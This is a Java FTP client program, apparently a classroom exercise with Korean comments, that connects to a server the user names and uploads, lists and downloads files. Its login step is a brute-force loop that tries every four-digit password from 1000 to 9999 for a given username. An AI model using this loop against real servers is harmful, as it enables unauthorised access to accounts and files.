

import java.io.File;
import java.util.Scanner;

import it.sauronsoftware.ftp4j.FTPClient;

public class BruteFocer {
	public static void main(String[] args) {

		Scanner sc = new Scanner(System.in);
		FTPClient client = new FTPClient();

		while(true) {


			int input=0;
			//[1] : 서버 접속
			while(true) {
				System.out.printf("=== FTP Client Program ===\n1. Connect FTP Server\n2. Exit Program\n>>>>");
				try {

					input = Integer.parseInt(sc.nextLine());
					break;
				}catch(Exception e) {

				}
			}


			if(input == 1) {
				while(true) {
					System.out.println("ip : ");
					String input2 = sc.nextLine();
					try {

						client.connect(input2);
						break;
					}catch(Exception e) {
						System.out.println("서비스에 접속할 수 없습니다.");
						e.printStackTrace();
					}
				}
			}else if(input== 2) {
				System.out.println("꺼져용");
				System.exit(0);
			}


			//[2] : 서버 로그인
			here:while(true) {
				System.out.print("아이디 : ");
				String id =sc.nextLine();
				while(true) {

					System.out.print("비밀번호 : ");
					//					int i =(int)(Math.random()*9000+1000);
					//					System.out.println(i);
					for(int i = 1000; i<10000; i++) {
						System.out.println(i);

				 try {
							client.login(id, ""+i);
							break here;
						}catch(Exception e) {
							System.out.println("로그인에 실패했습니다.");
							e.printStackTrace();
						}
					}
				}
			}
			while(true) {

				int menu = 0;
				System.out.printf("========== File ==========\n1. Upload File\n2. Download File\n3. Disconnect FTP Server and Exit\n4. Delete File\n>>>>");
				while(true) {
					try {
						menu =Integer.parseInt(sc.nextLine());
						break;
					}catch(Exception e) {

					}
				}
				if(menu == 1) {


					while(true) {
						System.out.println("업로드할 파일을 적어주세요");
						String msg2 = sc.nextLine();

						try {
							client.upload(new File(msg2));
							break;
						}catch(Exception e) {
							e.printStackTrace();
						}
					}
				}else if(menu == 2) {
					//[3] : 파일 목록 출력
					System.out.println("=====File list ======");
					try {

						String[] names = client.listNames();
						for(int i = 0; i<names.length; i++) {
							System.out.println(i+". "+names[i]);
						}
						System.out.print(">>>");

					}catch(Exception e) {
						e.printStackTrace();
					}

					//[4] : 파일 다운로드
					//[!] : 강사님이 \(역슬래쉬) 하나만 하거나 두개짜리둘다 된다 했는데 나는 두개짜리만 가능함
					while(true) {

						System.out.print("목록을 정해주세요 : ");
						String msg = sc.nextLine();
						System.out.print("다운 받을 경로를 정해주세요 : ");
						String msg1 = sc.nextLine();
						try{
							client.download(msg, new File(msg1));
							break;

						}catch(Exception e) {
							e.printStackTrace();
						}
					}
				}else if(menu == 3) {
					System.out.println("메뉴 화면으로 돌아갑니다.");
					break;
				}

				try {
					client.disconnect(true);
				}catch(Exception e) {
					e.printStackTrace();
				}
			}
		}
	}
}